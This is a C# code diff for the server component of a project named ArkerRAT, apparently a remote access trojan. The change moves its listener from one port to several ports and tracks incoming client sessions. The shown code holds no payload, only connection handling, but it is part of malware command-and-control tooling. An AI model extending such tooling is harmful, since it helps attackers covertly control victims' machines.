@@ -11,44 +11,79 @@ using System.Threading.Tasks;
 using System.IO;
 using System;
 using System.Windows;
+using System.Runtime.CompilerServices;
+using System.Diagnostics;
+using System.Windows.Threading;
+using ArkerRAT1;
+using ArkerRatWpfVersion;
 
 namespace ArkerRAT1
 {
     static class ArkerRATServerMechanics
     {
+
         static MainWindow mainWindow = new MainWindow();
-        public static int port = 2332;
-        static TcpListener listener = new TcpListener(IPAddress.Any, port);
-       
-        public static List<RATHostSession> RATClients = new List<RATHostSession>();
-        
+        public static List<RATHostSession> rATClients = new List<RATHostSession>();
+        public static List<int> ports = new List<int>();
+        private static List<TcpListener> listeners = new List<TcpListener>();
+
         static bool serverIsRunning = false;
 
         //A tag number will be used to diffrenciate the RATHostSession objects from eachother. 
         static int tag = 1;
-
-        public static async Task StartServer()
+        public static Task<TcpClient> serverThread;
+        public static async void StartServer()
         {
+            StopListener();
             serverIsRunning = true;
-            listener.Start();
-            MessageBox.Show("Listening SUCCESSFULY started on port " + port);
-
-            while (serverIsRunning)
+            await Task.Run(async () =>
             {
-                tag++;
-                
-                //Tag haas to be in string formate to work.
-                string tagText = Convert.ToString(tag);
-                TcpClient client = await listener.AcceptTcpClientAsync();
-                RATHostSession clientSession = new RATHostSession(client, tagText);
-                RATClients.Add(clientSession);
-            }
+
+                foreach (int port in ports)
+                {
+                    TcpListener listener = new TcpListener(IPAddress.Any, port);
+                    listeners.Add(listener);
+                    listener.Start();
+                    Task tempTask = Task.Run(async () =>
+                    {
+                        while (serverIsRunning)
+                        {
+                            if (!listener.Pending())
+                            {
+                                tag++;
+                                TcpClient client = await listener.AcceptTcpClientAsync();
+                                App.Current.Dispatcher.Invoke(() =>
+                                {
+                                    RATHostSession session = new RATHostSession(client, Convert.ToString(tag), port);
+                                    rATClients.Add(session);
+                                });
+                            }
+                        }
+                    });
+
+                }
+            });
         }
+
 
         public static void StopListener()
         {
-            serverIsRunning=false;
-            listener.Stop();
+            serverIsRunning = false;
+            try
+            {
+                foreach (TcpListener listener in listeners)
+                {
+                    listener.Stop();
+                }
+                listeners.Clear();
+            }
+            catch (Exception ex) { }
         }
+
     }
-}
+}    
+
+
+
+ 
+
